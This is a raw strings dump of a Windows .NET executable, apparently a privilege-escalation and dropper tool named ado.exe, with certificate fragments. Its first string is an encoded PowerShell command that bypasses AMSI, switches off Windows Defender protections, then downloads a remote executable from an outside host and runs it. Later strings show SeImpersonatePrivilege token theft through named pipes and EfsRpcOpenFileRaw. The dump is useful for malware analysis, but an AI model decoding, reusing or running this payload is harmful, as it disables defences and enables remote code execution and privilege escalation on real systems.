Metadata Signature: 0xfb4 0x10001424a5342 12
.NET Version: v2.0.50727
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: ca0
Stream name: #~ 4
DirectoryAddress: d0c Size: 10e0
Stream name: #Strings 12
DirectoryAddress: 1dec Size: 1384
Stream name: #US 4
DirectoryAddress: 3170 Size: 10
Stream name: #GUID 8
DirectoryAddress: 3180 Size: 2fc
Stream name: #Blob 8
[Strings]
nth paddr      vaddr      len  size section type    string
335 0x00002da3 0x00404ba3 1945 3891 .text   utf16le powershell.exe -nop -w hidden -e JAB3ACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYwAgAD0AIAAnAHMAaQAnADsAJABtACAAPQAgACcAVQB0AGkAbABzACcAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AG0AewAxAH0AewAyAH0AJwAgAC0AZgAgACQAdwAsACQAYwAsACQAbQApACkAIAA7ACAAJABmAGkAZQBsAGQAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQBtAHsAMAB9AEkAbgBpAHQARgBhAGkAbABlAGQAJwAgAC0AZgAgACQAYwApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlACAALQBEAGkAcwBhAGIAbABlAFMAYwByAGkAcAB0AFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIABoAHQAdABwADoALwAvAGYAYgBpAC4AZgB1AG4AZAAvAHQAbwByAHQAaQBsAGwAYQBzAC8AdABvAHIAdABpAGwAbABhAC4AZQB4AGUAIAAtAG8AdQB0AGYAaQBsAGUAIAB0AG8AcgB0AGkAbABsAGEALgBlAHgAZQA7AGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AZgBiAGkALgBmAHUAbgBkAC8AdABvAHIAdABpAGwAbABhAHMALwB0AG8AcgB0AGkAbABsAGEALgBlAHgAZQAgADsAIAAuAFwAdABvAHIAdABpAGwAbABhAC4AZQB4AGUA
336 0x00003cd7 0x00405ad7 18   37   .text   utf16le [+] Current user: 
337 0x00003cfd 0x00405afd 22   45   .text   utf16le SeImpersonatePrivilege
338 0x00003d2b 0x00405b2b 36   73   .text   utf16le [x] SeImpersonatePrivilege not held.
339 0x00003d79 0x00405b79 9    19   .text   utf16le \\.\pipe\
340 0x00003d8d 0x00405b8d 12   25   .text   utf16le \pipe\srvsvc
341 0x00003da7 0x00405ba7 25   51   .text   utf16le [x] can not create pipe: 
342 0x00003ddb 0x00405bdb 15   31   .text   utf16le [+] Get Token: 
343 0x00003dfb 0x00405bfb 15   31   .text   utf16le WinSta0\Default
344 0x00003e1c 0x00405c1c 66   134  .text   utf16le [!] process with pid: {0} created.\r\n==============================
345 0x00003ea2 0x00405ca2 24   49   .text   utf16le [x] operation timed out.
346 0x00003ed4 0x00405cd4 17   35   .text   utf16le \\localhost/PIPE/
347 0x00003f02 0x00405d02 36   73   .text   utf16le c681d488-d850-11d0-8c52-00c04fd90f7e
348 0x00003f4c 0x00405d4c 12   25   .text   utf16le \pipe\lsarpc
349 0x00003f66 0x00405d66 9    19   .text   utf16le localhost
350 0x00003f7a 0x00405d7a 29   59   .text   utf16le [x]EfsRpcOpenFileRaw failed: 
351 0x00003fb6 0x00405db6 8    17   .text   utf16le ncacn_np
352 0x00003fc8 0x00405dc8 48   97   .text   utf16le [x]RpcStringBindingCompose failed with status 0x
353 0x0000402e 0x00405e2e 52   105  .text   utf16le [x]RpcBindingFromStringBinding failed with status 0x
354 0x00004098 0x00405e98 44   89   .text   utf16le [x]RpcBindingSetOption failed with status 0x
355 0x000040f2 0x00405ef2 22   45   .text   utf16le [!]binding ok (handle=
356 0x00004159 0x00405f59 6    7    .text   ascii   \b\b\b\b\b\b
357 0x0000427a 0x0040607a 4    5    .text   ascii   \a\a\a 
358 0x0000437d 0x0040617d 4    5    .text   ascii   \n\r\a\t
359 0x00004416 0x00406216 22   23   .text   ascii   WrapNonExceptionThrows
360 0x00004462 0x00406262 11   12   .text   ascii   _CorExeMain
361 0x0000446e 0x0040626e 11   12   .text   ascii   mscoree.dll
362 0x000046a6 0x004080a6 15   32   .rsrc   utf16le VS_VERSION_INFO
363 0x00004704 0x00408104 10   22   .rsrc   utf16le arFileInfo
364 0x00004722 0x00408122 11   24   .rsrc   utf16le Translation
365 0x00004746 0x00408146 14   30   .rsrc   utf16le StringFileInfo
366 0x0000476a 0x0040816a 8    18   .rsrc   utf16le 000004b0
367 0x00004782 0x00408182 15   32   .rsrc   utf16le FileDescription
368 0x000047ae 0x004081ae 11   24   .rsrc   utf16le FileVersion
369 0x000047c8 0x004081c8 7    16   .rsrc   utf16le 0.0.0.0
370 0x000047de 0x004081de 12   26   .rsrc   utf16le InternalName
371 0x000047f8 0x004081f8 7    16   .rsrc   utf16le ado.exe
372 0x0000480e 0x0040820e 14   30   .rsrc   utf16le LegalCopyright
373 0x00004836 0x00408236 16   34   .rsrc   utf16le OriginalFilename
374 0x00004858 0x00408258 7    16   .rsrc   utf16le ado.exe
375 0x0000486e 0x0040826e 14   30   .rsrc   utf16le ProductVersion
376 0x0000488c 0x0040828c 7    16   .rsrc   utf16le 0.0.0.0
377 0x000048a2 0x004082a2 16   34   .rsrc   utf16le Assembly Version
378 0x000048c4 0x004082c4 7    16   .rsrc   utf16le 0.0.0.0
379 0x000048db 0x004082db 487  488  .rsrc   ascii   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">\r\n  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>\r\n  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">\r\n    <security>\r\n      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">\r\n        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n</assembly>\r\n
380 0x00004e22 0x00408822 4    5            ascii   1\v0\t
381 0x00004e3e 0x0040883e 4    5            ascii   >0<0
382 0x00004e5a 0x0040885a 4    5            ascii   0!0\t
383 0x00004e79 0x00408879 4    5            ascii   @:M\a
384 0x00004e96 0x00408896 5    6            ascii   ^\t7ki
385 0x00004eb1 0x004088b1 4    5            ascii   1\v0\t
386 0x00004ec9 0x004088c9 21   22           ascii   Symantec Corporation1
387 0x00004ee8 0x004088e8 26   27           ascii   Symantec Trust Network100.
388 0x00004f08 0x00408908 41   42           ascii   'Symantec Class 3 SHA256 Code Signing CA0
389 0x00004f33 0x00408933 14   15           ascii   \r180514000000Z
390 0x00004f42 0x00408942 20   21           ascii   \r210617235959Z0v1\v0\t
391 0x00004f6a 0x0040896a 15   16           ascii   North Carolina1
392 0x00004f80 0x00408980 11   12           ascii   \a\f\aRaleigh1
393 0x00004f95 0x00408995 21   22           ascii   Global Software, LLC1
394 0x00004fb4 0x004089b4 21   22           ascii   Global Software, LLC0
395 0x00004ff0 0x004089f0 5    7            utf8    G|Β]< blocks=Basic Latin,Greek and Coptic
396 0x00005014 0x00408a14 4    5            ascii   <l"F
397 0x00005021 0x00408a21 4    5            ascii   yoFw
398 0x0000505f 0x00408a5f 7    8            ascii   \ju)2!1
399 0x00005091 0x00408a91 5    6            ascii   `QpdX
400 0x000050d4 0x00408ad4 4    5            ascii   >7n;
401 0x000050e3 0x00408ae3 4    5            ascii   >E>~
402 0x00005119 0x00408b19 5    6            ascii   $0"0 
403 0x00005124 0x00408b24 28   29           ascii   http://sv.symcb.com/sv.crl0a
404 0x00005146 0x00408b46 5    6            ascii   Z0X0V
405 0x00005153 0x00408b53 4    5            ascii   0L0#
406 0x00005163 0x00408b63 25   26           ascii   https://d.symcb.com/cps0%
407 0x0000518a 0x00408b8a 24   25           ascii   https://d.symcb.com/rpa0
408 0x000051c3 0x00408bc3 4    5            ascii   K0I0
409 0x000051d4 0x00408bd4 21   22           ascii   http://sv.symcd.com0&
410 0x000051f5 0x00408bf5 27   28           ascii   http://sv.symcb.com/sv.crt0
411 0x000052ee 0x00408cee 4    6            utf8    տb;q blocks=Armenian,Basic Latin
412 0x00005306 0x00408d06 4    5            ascii   E8\f\r
413 0x0000532f 0x00408d2f 4    5            ascii   C7N3
414 0x00005337 0x00408d37 4    5            ascii   N'60
415 0x00005343 0x00408d43 5    6            ascii   ~'U:A
416 0x0000537f 0x00408d7f 4    6            utf8    ʆ*0\r blocks=IPA Extensions,Basic Latin
417 0x00005394 0x00408d94 4    5            ascii   1\v0\t
418 0x000053ac 0x00408dac 15   16           ascii   VeriSign, Inc.1
419 0x000053c5 0x00408dc5 26   27           ascii   VeriSign Trust Network1:08
420 0x000053e5 0x00408de5 54   55           ascii   1(c) 2006 VeriSign, Inc. - For authorized use only1E0C
421 0x00005421 0x00408e21 62   63           ascii   <VeriSign Class 3 Public Primary Certification Authority - G50
422 0x00005461 0x00408e61 14   15           ascii   \r131210000000Z
423 0x00005470 0x00408e70 15   16           ascii   \r231209235959Z0
424 0x00005480 0x00408e80 4    5            ascii   1\v0\t
425 0x00005498 0x00408e98 21   22           ascii   Symantec Corporation1
426 0x000054b7 0x00408eb7 26   27           ascii   Symantec Trust Network100.
427 0x000054d7 0x00408ed7 41   42           ascii   'Symantec Class 3 SHA256 Code Signing CA0
428 0x00005537 0x00408f37 5    6            ascii   XM#bj
429 0x0000554b 0x00408f4b 4    6            utf8    /!Pڞ blocks=Basic Latin,Arabic
430 0x00005552 0x00408f52 4    6            utf8    _'N\v
431 0x00005568 0x00408f68 5    8            utf8    ΑrT.Σ blocks=Greek and Coptic,Basic Latin
432 0x00005572 0x00408f72 5    6            ascii   R\e?A<
433 0x0000559b 0x00408f9b 5    7            utf8    1-=nܵ blocks=Basic Latin,Syriac
434 0x000055bd 0x00408fbd 6    9            utf8    UGSٳ2֡ blocks=Basic Latin,Arabic,Hebrew
435 0x000055d7 0x00408fd7 4    5            ascii   ba \n
436 0x000055f1 0x00408ff1 8    10           utf8    5܌+ojr\` blocks=Basic Latin,Syriac
437 0x0000563a 0x0040903a 4    5            ascii   #0!0
438 0x0000564b 0x0040904b 20   21           ascii   http://s2.symcb.com0
439 0x0000567a 0x0040907a 5    6            ascii   e0c0a
440 0x0000568c 0x0040908c 4    5            ascii   0R0&
441 0x0000569c 0x0040909c 28   29           ascii   http://www.symauth.com/cps0(
442 0x000056c6 0x004090c6 28   29           ascii   http://www.symauth.com/rpa00
443 0x000056e8 0x004090e8 5    6            ascii   )0'0%
444 0x000056f3 0x004090f3 32   33           ascii   http://s1.symcb.com/pca3-g5.crl0
445 0x0000575b 0x0040915b 18   19           ascii   SymantecPKI-1-5670
446 0x000057a9 0x004091a9 5    6            ascii   3130\r
447 0x0000580f 0x0040920f 5    7            utf8    ϻ5/3X blocks=Greek and Coptic,Basic Latin
448 0x0000585a 0x0040925a 4    5            ascii   L'{\v
449 0x000058d0 0x004092d0 4    5            ascii   1\v0\t
450 0x000058e8 0x004092e8 21   22           ascii   Symantec Corporation1
451 0x00005907 0x00409307 26   27           ascii   Symantec Trust Network100.
452 0x00005927 0x00409327 40   41           ascii   'Symantec Class 3 SHA256 Code Signing CA
453 0x00005957 0x00409357 5    6            ascii   ^\t7ki
454 0x00005a28 0x00409428 4    5            ascii   g&M{
455 0x00005a3f 0x0040943f 4    6            utf8    D\nI̬ blocks=Basic Latin,Combining Diacritical Marks
456 0x00005aa8 0x004094a8 7    8            ascii   ;A}L(\ar
457 0x00005ad2 0x004094d2 4    5            ascii   vCD~
458 0x00005ae6 0x004094e6 5    7            utf8    ٨x*<m blocks=Arabic,Basic Latin

